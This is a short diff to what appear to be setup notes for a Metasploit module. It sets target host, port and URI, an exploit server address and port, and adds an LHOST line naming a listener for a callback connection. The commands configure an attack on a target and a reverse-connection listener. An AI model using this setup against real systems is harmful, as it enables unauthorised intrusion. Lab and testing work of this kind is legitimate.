@@ -45,6 +45,7 @@ use 6
 setg RHOSTS <target-ip>  # 10.208.89.15
 setg RPORT <target-port> # 8080
 setg SRVHOST <host-server-ip> # 10.208.5.100
+setg LHOST <listen-server-ip> # 10.208.5.100
 setg SRVPORT <host-server-port> # 1389
 setg TARGETURI <target url> # /
 
